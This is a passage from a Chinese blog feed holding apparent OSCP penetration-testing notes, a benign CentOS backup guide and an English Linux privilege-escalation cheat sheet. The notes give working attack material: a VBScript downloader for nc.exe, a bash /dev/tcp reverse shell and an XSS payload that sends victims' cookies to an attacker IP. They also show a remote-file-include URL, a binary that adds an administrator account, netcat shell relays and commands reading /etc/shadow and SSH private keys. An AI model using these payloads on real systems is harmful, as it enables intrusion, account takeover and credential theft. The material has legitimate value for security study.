CreateObject(“WinHttp.WinHttpRequest.5.1”) &gt;&gt; wget.vbs<br>echo If http Is Nothing Then Set http = CreateObject(“WinHttp.WinHttpRequest”) &gt;&gt; wget.vbs<br>echo If http Is Nothing Then Set http = CreateObject(“MSXML2.ServerXMLHTTP”) &gt;&gt; wget.vbs<br>Echo If http Is Nothing Then Set http = CreateObject(“Microsoft.XMLHTTP”) &gt;&gt; wget.vbs<br>echo http.Open “GET”, strURL, False &gt;&gt; wget.vbs<br>echo http.Send &gt;&gt; wget.vbs<br>echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br>echo Set http = Nothing &gt;&gt; wget.vbs<br>echo Set fs = CreateObject(“Scripting.FileSystemObject”) &gt;&gt; wget.vbs<br>echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br>echo strData = “” &gt;&gt; wget.vbs<br>echo strBuffer = “” &gt;&gt; wget.vbs<br>echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br>echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs<br>echo Next &gt;&gt; wget.vbs<br>echo ts.Close &gt;&gt; wget.vbs</p><p> </p><p>使用方法,直接复制到shell,在目标机桌面会生成wget.vbs</p><p>cscript wget.vbs <a href="http://www.jinzz.cc/nc.exe">http://www.jinzz.cc/nc.exe</a> nc.exe</p><p>这样就可以下载nc.exe</p><h3 id="Shadow-密码文件"><a href="#Shadow-密码文件" class="headerlink" title="Shadow - 密码文件"></a>Shadow - 密码文件</h3><p>登录Linux时会要求输入用户名和密码。通常本地文件中会存储一份用户密码，并与用户输入对比，如果相同就允许用户登录。起初用户密码存储于<code>/etc/passwd</code>中，但由于/etc/passwd必须供所有用户读取，因此为避免密码破译，Unix系统将加密后的密码存储于<code>/etc/shadow</code>中，仅供超级用户可读（大型站点中使用NIS、LDAP、NIS+等方式存储）。</p><p>/etc/shadow中的密码格式：</p><p>$id$salt$encrypted</p><p>id表示hash算法。起初密码用DES算法加密，但因随DES加密破解难度的降低，已用其他加密算法替代DES。在shadow文件中，密码字段如果以”$”打头，则表示<strong>非DES加密</strong>，如：</p><p>$1$2eWq10AC$NaQqalCk3InEPBrIxjaJQ1</p><p>即表示非DES加密密码。而<code>$1$</code>表示使用了基于MD5的加密算法。</p><p>$2a$04$NZJWn7W2skvQRC5lW3H7q.ZTE8bz4xbCAtU1ttzUOy63si3phphUu</p><p><code>$2a$</code>表示Blowfish算法。常见的标识与算法：</p><p>$1$   MD5</p><p>$2a$ Blowfish</p><p>$5$ SHA256</p><p>$6$ SHA512</p><p>/etc/passwd文件</p><p>/etc/passwd文件的格式：</p><p>username:passwd:UID:GID:full_name:directory:shell</p><h3 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a>/etc/shadow文件</h3><p>首先从shadow文件中摘录数行：</p><p>root:$1$TCVDVaiT$JC7TbKjvIZpIprdehWFH/1:15157:0:99999:7::: bin:*:15157:0:99999:7::: daemon:*:15157:0:99999:7:::</p><p>/etc/shadow文件的每行由9个字段组成，以”:”作为字段分隔符。每个字段的说明：</p><ol><li>用户名（login name）。</li><li>加密后的密码（形如：$1$2eWq10AC$NaQqalCk3InEPBrIxjaJQ1）。如果密码是”*“或”!”，则表示这个不会用这个帐号来登录（通常是一些后台进程）。</li><li>密码最后修改时间，从1970年1月1日起计算的天数。</li><li>不可修改密码的天数。如果是0，表示随时可修改密码。如果是N，表示N天后才能修改密码。</li><li>密码可以维系的天数。如果设置为N，则表示N天后必须更新密码。设置为99999通常表示无需更新密码。</li><li>在密码必须修改前的N天，就开始提示用户需要修改密码。</li><li>密码过期的宽限时间。</li><li>帐号失效时间。也是UNIX时间戳格式。</li><li>最后一个字段是保留字段。</li></ol><p> </p><p> </p><h3 id="Windows本地missconfigration提权"><a href="#Windows本地missconfigration提权" class="headerlink" title="Windows本地missconfigration提权"></a>Windows本地missconfigration提权</h3><p>查看windows上运行服务的所需权限</p><p>windows+R   service.msc</p><p>查看正在运行的服务</p><p>右键属性找到.exe文件</p><p>在cmd内cd到指定目录</p><p>icacls xxx.exe</p><p>即可查看到当前exe运行所需的权限</p><p>如果观察到当前exe有类似于EVERYONE之类的权限就说明有missconfigration</p><p>可以用一个恶意exe文件去代替</p><p>#include &lt;stdlib.h&gt;</p><p>int main()</p><p>{ </p><p>int i;</p><p> i = system (“net localgroup administrators xxxx /add”) </p><p>return 0;</p><p>}</p><p>再使用</p><p>i586-mingw32msvc-gcc xxxx.c</p><p>将其编译成.exe文件并发送到目标机器上,使其服务重启即可添加xxxx用户到administrators权限组中</p><p> </p><h3 id="Linux本地missconfigration提权"><a href="#Linux本地missconfigration提权" class="headerlink" title="Linux本地missconfigration提权"></a>Linux本地missconfigration提权</h3><p>find / -perm -2 ! -type l -ls 2&gt;/dev/null</p><p>寻找有777权限的错误配置的文件,特别是一些第三方软件的.sh脚本</p><p>在其中插入恶意代码</p><p>bash -i &gt;&amp; /dev/tcp/192.168.100.118/443 0&gt;&amp;1</p><p>这个是向192.168.100.118:443发送了一个最高权限的shell</p><p> </p><h3 id="通过XSS劫持Cookies并伪造Cookie登录"><a href="#通过XSS劫持Cookies并伪造Cookie登录" class="headerlink" title="通过XSS劫持Cookies并伪造Cookie登录"></a>通过XSS劫持Cookies并伪造Cookie登录</h3><p>需要使用firefox浏览器并安装两个add-one</p><p>cookies manager +</p><p>temper data</p><p> </p><p>目标站点未对用户输入进行过滤,导致用户可以上传一段包含脚本的字符,从而使接下来浏览该网页的人受到影响</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010160628.png"></p><script>alert("XSS");</script><p> </p><p>更进一步,将XSS脚本改为</p><script>new Image().src="http://10.11.0.209:4444/bogus.php?output="+document.cookie;</script><p>就会向10.11.0.209这台机子的4444端口发送连接信息,即可获得当前受害者机器的cookies</p><p><img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010163738.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010164025.png"> <img src="/images/QQ%E6%8B%BC%E9%9F%B3%E6%88%AA%E5%9B%BE20171010164051.png"></p><p>再使用当前获取的受害者cookies信息伪造成自己的cookies信息就可以以受害者的身份登录</p><p> </p><p> </p><p>注意用PHP编写的网页例如切换语言时是否有<a href="http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=fr&amp;Submit=Submit">http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=fr&amp;Submit=Submit</a></p><p>这样的链接,注意红字标明的位置,如果该服务器PHP配置时未进行正确配置,allow_url_fopen = on 时此处可以替换成恶意链接.</p><p><a href="http://47.90.101.155/evil.txt%E7%9A%84%E5%86%85%E5%AE%B9%E4%B8%BAphp%E8%AF%AD%E8%A8%80">http://47.90.101.155/evil.txt的内容为php语言</a></p><p>echo ‘<?php echo shell\_exec("ipconfig");?>‘ &gt;/var/www/evil.txt</p><p>任何用户输入该链接</p><p><a href="http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=http://47.90.101.155/evil.txt%00&amp;Submit=Submit">http://xxxxxxx/addguestbook.php?name=hahaha&amp;comment=hahaha&amp;LANG=http://47.90.101.155/evil.txt%00&amp;Submit=Submit</a></p><p>该处%00意为忽略%00后面的代码段</p><p>执行后/var/www/evil.txt处会保存有该服务器ipconfig后的结果</p><p> </p><p>WEB相关工具</p><p>nikto</p><p>dirbuster</p><p>gobuster</p>]]></content>
      
      
      <categories>
          
          <category> oscp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>centos7系统备份与还原</title>
      <link href="0bb951b55823/"/>
      <url>0bb951b55823/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>在使用Ubuntu之前，相信很多人都有过使用Windows系统的经历。如果你备份过Windows系统，那么你一定记忆犹新：首先需要找到一个备份工具(通常都是私有软件)，然后重启电脑进入备份工具提供的软件环境，在这里备份或者恢复Windows系统。Norton Ghost是备份Windows系统时经常使用的备份工具。</p><p>在备份Windows系统的时候你可能想过，我能不能把整个C盘都放到一个ZIP文件里去呢。这在Windows下是不可能的，因为在Windows中有很多文件在它们运行时是不允许拷贝或覆盖的，因此你需要专门的备份工具对Windows系统进行特殊处理。</p><p>和备份Windows系统不同，如果你要备份Ubuntu系统(或者其它任何Linux系统)，你不再需要像Ghost这类备份工具。事实上，Ghost这类备份工具对于Linux文件系统的支持很糟糕，例如一些Ghost版本只能完善地支持Ext2文件系统，如果你用它来备份Ext3文件系统，你可能会丢失一些宝贵的数据。</p><h2 id="2-本文分析内容安排"><a href="#2-本文分析内容安排" class="headerlink" title="2. 本文分析内容安排"></a>2. 本文分析内容安排</h2><ol><li>备份系统</li><li>恢复系统</li></ol><h2 id="3-备份系统"><a href="#3-备份系统" class="headerlink" title="3. 备份系统"></a>3. 备份系统</h2><p>我该如何备份我的Ubuntu系统呢？很简单，就像你备份或压缩其它东西一样，使用TAR。和Windows不同，Linux不会限制root访问任何东西，你可以把分区上的所有东西都扔到一个TAR文件里去！ 首先成为root用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>然后进入文件系统的根目录(当然，如果你不想备份整个文件系统，你也可以进入你想要备份的目录，包括远程目录或者移动硬盘上的目录)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /</span><br></pre></td></tr></table></figure><p>下面是我用来备份系统的完整命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar cvpzf backup.tgz --exclude=/proc --exclude=/lost+found --exclude=/mnt --exclude=/sys --exclude=backup.tgz /</span><br></pre></td></tr></table></figure><p>让我们来简单看一下这个命令： “tar”当然就是我们备份系统所使用的程序了。 “cvpfz”是tar的选项，意思是“创建档案文件”、“保持权限”(保留所有东西原来的权限)、“使用gzip来减小文件尺寸”。 “backup.gz”是我们将要得到的档案文件的文件名。 “/”是我们要备份的目录，在这里是整个文件系统。 在 档案文件名“backup.gz”和要备份的目录名“/”之间给出了备份时必须排除在外的目录。有些目录是无用的，例如“/proc”、“/lost+ found”、“/sys”。当然，“backup.gz”这个档案文件本身必须排除在外，否则你可能会得到一些超出常理的结果。如果不把“/mnt”排 除在外，那么挂载在“/mnt”上的其它分区也会被备份。另外需要确认一下“/media”上没有挂载任何东西(例如光盘、移动硬盘)，如果有挂载东西， 必须把“/media”也排除在外。 有人可能会建议你把“/dev”目录排除在外，但是我认为这样做很不妥，具体原因这里就不讨论了。 执行备份命令之前请再确认一下你所键入的命令是不是你想要的。执行备份命令可能需要一段不短的时间。 备份完成后，在文件系统的根目录将生成一个名为“backup.tgz”的文件，它的尺寸有可能非常大。现在你可以把它烧录到DVD上或者放到你认为安全的地方去。 在备份命令结束时你可能会看到这样一个提示：’tar: Error exit delayed from previous errors’，多数情况下你可以忽略它。 你还可以用Bzip2来压缩文件，Bzip2比gzip的压缩率高，但是速度慢一些。如果压缩率对你来说很重要，那么你应该使用Bzip2，用“j”代替命令中的“z”，并且给档案文件一个正确的扩展名“bz2”。完整的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar cvpjf backup.tar.bz2 –exclude=/proc –exclude=/lost+found –exclude=/backup.tar.bz2 –exclude=/mnt –exclude=/sys /</span><br></pre></td></tr></table></figure><h2 id="4-恢复系统"><a href="#4-恢复系统" class="headerlink" title="4. 恢复系统"></a>4. 恢复系统</h2><p>在进行恢复系统的操作时一定要小心！如果你不清楚自己在做什么，那么你有可能把重要的数据弄丢，请务必小心！ 接着上面的例子。切换到root用户，并把文件“backup.tgz”拷贝到分区的根目录下。 在 Linux中有一件很美妙的事情，就是你可以在一个运行的系统中恢复系统，而不需要用boot-cd来专门引导。当然，如果你的系统已经挂掉不能启动了， 你可以用Live CD来启动，效果是一样的。你还可以用一个命令把Linux系统中的所有文件干掉，当然在这里我不打算给出这个命令！ 使用下面的命令来恢复系统：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar xvpfz backup.tgz -C /</span><br></pre></td></tr></table></figure><p>如果你的档案文件是使用Bzip2压缩的，应该用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar xvpfj backup.tar.bz2 -C /</span><br></pre></td></tr></table></figure><p>注意：上面的命令会用档案文件中的文件覆盖分区上的所有文件。 执行恢复命令之前请再确认一下你所键入的命令是不是你想要的，执行恢复命令可能需要一段不短的时间。 恢复命令结束时，你的工作还没完成，别忘了重新创建那些在备份时被排除在外的目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir proc</span><br><span class="line">mkdir lost+found</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir sys</span><br></pre></td></tr></table></figure><p>当你重启电脑，你会发现一切东西恢复到你创建备份时的样子了！</p>]]></content>
      
      
      <categories>
          
          <category> centos7运维笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基本Linux提权操作</title>
      <link href="3bb5445a9dab/"/>
      <url>3bb5445a9dab/</url>
      
        <content type="html"><![CDATA[<h2 id="常用Script"><a href="#常用Script" class="headerlink" title="常用Script"></a>常用Script</h2><p>LinEnum.sh</p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>linPeas</p><p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p><p>winPeas</p><p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a></p><p> </p><h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><p>What’s the distribution type? What version?</p><p>cat /etc/issue<br>cat /etc/*-release<br>cat /etc/lsb-release # Debian based<br>cat /etc/redhat-release # Redhat based</p><p>What’s the kernel version? Is it 64-bit?</p><p>cat /proc/version<br>uname -a<br>uname -mrs<br>rpm -q kernel<br>dmesg | grep Linux<br>ls /boot | grep vmlinuz-</p><p>What can be learnt from the environmental variables?</p><p>cat /etc/profile<br>cat /etc/bashrc<br>cat ~/.bash_profile<br>cat ~/.bashrc<br>cat ~/.bash_logout<br>env<br>set</p><p>Is there a printer?</p><p>lpstat -a</p><h2 id="Applications-amp-Services"><a href="#Applications-amp-Services" class="headerlink" title="Applications &amp; Services"></a>Applications &amp; Services</h2><p>What services are running? Which service has which user privilege?</p><p>ps aux<br>ps -ef<br>top<br>cat /etc/services</p><p>Which service(s) are been running by root? Of these services, which are vulnerable - it’s worth a double check!</p><p>ps aux | grep root<br>ps -ef | grep root</p><p>What applications are installed? What version are they? Are they currently running?</p><p>ls -alh /usr/bin/<br>ls -alh /sbin/<br>dpkg -l<br>rpm -qa<br>ls -alh /var/cache/apt/archivesO<br>ls -alh /var/cache/yum/</p><p>Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?</p><p>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf<br>ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/</p><p>What jobs are scheduled?</p><p>crontab -l<br>ls -alh /var/spool/cron<br>ls -al /etc/ | grep cron<br>ls -al /etc/cron*<br>cat /etc/cron*<br>cat /etc/at.allow<br>cat /etc/at.deny<br>cat /etc/cron.allow<br>cat /etc/cron.deny<br>cat /etc/crontab<br>cat /etc/anacrontab<br>cat /var/spool/cron/crontabs/root</p><p>Any plain text usernames and/or passwords?</p><p>grep -i user [filename]<br>grep -i pass [filename]<br>grep -C 5 “password” [filename]<br>find . -name “*.php” -print0 | xargs -0 grep -i -n “var $password” # Joomla</p><h2 id="Communications-amp-Networking"><a href="#Communications-amp-Networking" class="headerlink" title="Communications &amp; Networking"></a>Communications &amp; Networking</h2><p>What NIC(s) does the system have? Is it connected to another network?</p><p>/sbin/ifconfig -a<br>cat /etc/network/interfaces<br>cat /etc/sysconfig/network</p><p>What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?</p><p>cat /etc/resolv.conf<br>cat /etc/sysconfig/network<br>cat /etc/networks<br>iptables -L<br>hostname<br>dnsdomainname</p><p>What other users &amp; hosts are communicating with the system?</p><p>lsof -i<br>lsof -i :80<br>grep 80 /etc/services<br>netstat -antup<br>netstat -antpx<br>netstat -tulpn<br>chkconfig –list<br>chkconfig –list | grep 3:on<br>last<br>w</p><p>Whats cached? IP and/or MAC addresses</p><p>arp -e<br>route<br>/sbin/route -nee</p><p>Is packet sniffing possible? What can be seen? Listen to live traffic</p><p>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21<br>Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</p><p>Have you got a shell? Can you interact with the system?</p><p>nc -lvp 4444 # Attacker. Input (Commands)<br>nc -lvp 4445 # Attacker. Ouput (Results)<br>telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets system. Use the attackers IP!</p><p>Note: <a href="http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a></p><p> </p><p>Is port forwarding possible? Redirect and interact with traffic from another view</p><p>Note: <a href="http://www.boutell.com/rinetd/">http://www.boutell.com/rinetd/</a></p><p>Note: <a href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch">http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a></p><p>Note: <a href="http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2/_1.zip">http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2\_1.zip</a></p><p>Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]</p><p>FPipe.exe -l 80 -r 80 -s 80 192.168.1.7</p><p>Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</p><p>ssh -L 8080:127.0.0.1:80 <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#49;&#46;&#x37;">&#x72;&#111;&#111;&#116;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#49;&#46;&#x37;</a> # Local Port<br>ssh -R 8080:127.0.0.1:80 <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#x37;">&#114;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#49;&#x2e;&#x37;</a> # Remote Port</p><p>Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe</p><p>mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay<br>mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)<br>mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)</p><p>Is tunnelling possible? Send commands locally, remotely</p><p>ssh -D 127.0.0.1:9050 -N [username]@[ip]<br>proxychains ifconfig</p><h2 id="Confidential-Information-amp-Users"><a href="#Confidential-Information-amp-Users" class="headerlink" title="Confidential Information &amp; Users"></a>Confidential Information &amp; Users</h2><p>Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?</p><p>id<br>who<br>w<br>last<br>cat /etc/passwd | cut -d: -f1 # List of users<br>grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’ # List of super users<br>awk -F: ‘($3 == “0”) {print}’ /etc/passwd # List of super users<br>cat /etc/sudoers<br>sudo -l</p><p>What sensitive files can be found?</p><p>cat /etc/passwd<br>cat /etc/group<br>cat /etc/shadow<br>ls -alh /var/mail/</p><p>Anything “interesting” in the home directorie(s)? If it’s possible to access</p><p>ls -ahlR /root/<br>ls -ahlR /home/</p><p>Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords</p><p>cat /var/apache2/config.inc<br>cat /var/lib/mysql/mysql/user.MYD<br>cat /root/anaconda-ks.cfg</p><p>What has the user being doing? Is there any password in plain text? What have they been edting?</p><p>cat ~/.bash_history<br>cat ~/.nano_history<br>cat ~/.atftp_history<br>cat ~/.mysql_history<br>cat ~/.php_history</p><p>What user information can be found?</p><p>cat ~/.bashrc<br>cat ~/.profile<br>cat /var/mail/root<br>cat /var/spool/mail/root</p><p>Can private-key information be found?</p><p>cat ~/.ssh/authorized_keys<br>cat ~/.ssh/identity.pub<br>cat ~/.ssh/identity<br>cat ~/.ssh/id_rsa.pub<br>cat ~/.ssh/id_rsa<br>cat ~/.ssh/id_dsa.pub<br>cat ~/.ssh/id_dsa<br>cat /etc/ssh/ssh_config<br>cat /etc/ssh/sshd_config<br>cat /etc/ssh/ssh_host_dsa_key.pub<br>cat /etc/ssh/ssh_host_dsa_key<br>cat /etc/ssh/ssh_host_rsa_key.pub<br>cat /etc/ssh/ssh_host_rsa_key<br>cat /etc/ssh/ssh_host_key.pub<br>cat /etc/ssh/ssh_host_key</p><p>File Systems</p><p>Which configuration files can be written in /etc/? Able to reconfigure a service?</p><p>ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/‘ 2&gt;/dev/null # Anyone<br>ls -aRl /etc/ | awk ‘$1 ~ /^..w/‘ 2&gt;/dev/null # Owner<br>ls -aRl /etc/ | awk ‘$1 ~ /^…..w/‘ 2&gt;/dev/null # Group<br>ls -aRl /etc/ | awk ‘$1 ~ /w.$/‘ 2&gt;/dev/null # Other</p><p>find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone</p><p>What can be found in /var/ ?</p><p>ls -alh /var/log<br>ls -alh /var/mail<br>ls -alh /var/spool<br>ls -alh /var/spool/lpd<br>ls -alh /var/lib/pgsql<br>ls -alh /var/lib/mysql<br>cat /var/lib/dhcp3/dhclient.leases</p><p>Any settings/files (hidden) on website? Any settings file with database information?</p><p>ls -alhR /var/www/<br>ls -alhR /srv/www/htdocs/<br>ls -alhR /usr/local/www/apache22/data/<br>ls -alhR /opt/lampp/htdocs/<br>ls -alhR /var/www/html/</p><p>Is there anything in the log file(s) (Could help with “Local File Includes”!)</p><p>cat /etc/httpd/logs/access_log<br>cat /etc/httpd/logs/access.log<br>cat /etc/httpd/logs/error_log<br>cat /etc/httpd/logs/error.log<br>cat /var/log/apache2/access_log<br>cat /var/log/apache2/access.log<br>cat /var/log/apache2/error_log<br>cat /var/log/apache2/error.log<br>cat /var/log/apache/access_log<br>cat /var/log/apache/access.log<br>cat /var/log/auth.log<br>cat /var/log/chttp.log<br>cat /var/log/cups/error_log<br>cat /var/log/dpkg.log<br>cat /var/log/faillog<br>cat /var/log/httpd/access_log<br>cat /var/log/httpd/access.log<br>cat /var/log/httpd/error_log<br>cat /var/log/httpd/error.log<br>cat /var/log/lastlog<br>cat /var/log/lighttpd/access.log<br>cat /var/log/lighttpd/error.log<br>cat /var/log/lighttpd/lighttpd.access.log<br>cat /var/log/lighttpd/lighttpd.error.log<br>cat /var/log/messages<br>cat /var/log/secure<br>cat /var/log/syslog<br>cat /var/log/wtmp<br>cat /var/log/xferlog<br>cat /var/log/yum.log<br>cat /var/run/utmp<br>cat /var/webmin/miniserv.log<br>cat /var/www/logs/access_log<br>cat /var/www/logs/access.log<br>ls -alh /var/lib/dhcp3/<br>ls -alh /var/log/postgresql/<br>ls -alh /var/log/proftpd/<br>ls -alh /var/log/samba/</p><p>Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp Note: <a href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/">http://www.thegeekstuff.com/2011/08/linux-var-log-files/</a></p><p>If commands are limited, you break out of the “jail” shell?</p><p>python -c ‘import pty;pty.spawn(“/bin/bash”)’<br>echo os.system(‘/bin/bash’)<br>/bin/sh -i</p><p>How are file-systems mounted?</p><p>mount<br>df -h</p><p>Are there any unmounted file-systems?</p><p>cat /etc/fstab</p><p>What “Advanced Linux File Permissions” are used? Sticky bits, SUID &amp; GUID</p><p>find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.<br>find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.<br>find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.<br>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r “bin$”`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;/dev/null; done # Looks in ‘common’ places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} ; 2&gt;/dev/null</p><p>Where can written to and executed from? A few ‘common’ places: /tmp, /var/tmp, /dev/shm</p><p>find / -writable -type d 2&gt;/dev/null # world-writeable folders<br>find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders<br>find / -perm -o w -type d 2&gt;/dev/null # world-writeable folders<br>find / -perm -o x -type d 2&gt;/dev/null # world-executable folders find / ( -perm -o w -perm -o x ) -type d 2&gt;/dev/null # world-writeable &amp; executable folders</p><p>Any “problem” files? Word-writeable, “nobody” files</p><p>find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable files<br>find /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files</p><h2 id="Preparation-amp-Finding-Exploit-Code"><a href="#Preparation-amp-Finding-Exploit-Code" class="headerlink" title="Preparation &amp; Finding Exploit Code"></a>Preparation &amp; Finding Exploit Code</h2><p>What development tools/languages are installed/supported?</p><p>find / -name perl*<br>find / -name python*<br>find / -name gcc*<br>find / -name cc</p><p>How can files be uploaded?</p><p>find / -name wget<br>find / -name nc*<br>find / -name netcat*<br>find / -name tftp*<br>find / -name ftp</p><h2 id="Finding-exploit-code"><a href="#Finding-exploit-code" class="headerlink" title="Finding exploit code"></a>Finding exploit code</h2><p><a href="http://www.exploit-db.com/">http://www.exploit-db.com</a></p><p><a href="http://1337day.com/">http://1337day.com</a></p><p><a href="http://www.securiteam.com/">http://www.securiteam.com</a></p><p><a href="http://www.securityfocus.com/">http://www.securityfocus.com</a></p><p><a href="http://www.exploitsearch.net/">http://www.exploitsearch.net</a></p><p><a href="http://metasploit.com/modules/">http://metasploit.com/modules/</a></p><p><a href="http://securityreason.com/">http://securityreason.com</a></p><p><a href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a></p><p><a href="http://www.google.com/">http://www.google.com</a></p><p>Finding more information regarding the exploit</p><p><a href="http://www.cvedetails.com/">http://www.cvedetails.com</a></p><p><a href="http://packetstormsecurity.org/files/cve//[CVE/]">http://packetstormsecurity.org/files/cve/\[CVE\]</a></p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=%5C%5BCVE%5C%5D">http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\]</a></p><p><a href="http://www.vulnview.com/cve-details.php?cvename=%5C%5BCVE%5C%5D">http://www.vulnview.com/cve-details.php?cvename=\[CVE\]</a></p><p>(Quick) “Common” exploits. Warning. Pre-compiled binaries files. Use at your own risk</p><p><a href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a></p><p><a href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p><p>Mitigations</p><p>Is any of the above information easy to find?</p><p>Try doing it! Setup a cron job which automates script(s) and/or 3rd party products</p><p>Is the system fully patched?</p><p>Kernel, operating system, all applications, their plugins and web services</p><p> apt-get update &amp;&amp; apt-get upgrade<br> yum update</p><p>Are services running with the minimum level of privileges required?</p><p>For example, do you need to run MySQL as root?</p><p>Scripts Can any of this be automated?!</p><p><a href="http://pentestmonkey.net/tools/unix-privesc-check/">http://pentestmonkey.net/tools/unix-privesc-check/</a></p><p><a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a></p><p><a href="http://bastille-linux.sourceforge.net/">http://bastille-linux.sourceforge.net</a></p><p>Other (quick) guides &amp; Links</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p><a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</a></p><p><a href="http://www.microloft.co.uk/hacking/hacking3.htm">http://www.microloft.co.uk/hacking/hacking3.htm</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p><a 